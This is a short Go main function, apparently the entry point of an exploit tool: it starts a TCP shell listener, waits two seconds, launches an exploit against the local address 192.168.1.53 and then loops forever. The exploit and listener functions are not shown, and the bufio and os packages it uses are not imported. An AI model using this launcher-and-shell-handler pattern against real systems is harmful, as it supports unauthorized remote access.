package main

import (
  //"fmt"
  "time"
)

func main(){
  stdreader := bufio.NewReader(os.Stdin)
  go ListenAndHandleTCPShell(stdreader)
  time.Sleep(2000 * time.Millisecond)
  LaunchExploit("192.168.1.53")
  for {}
}
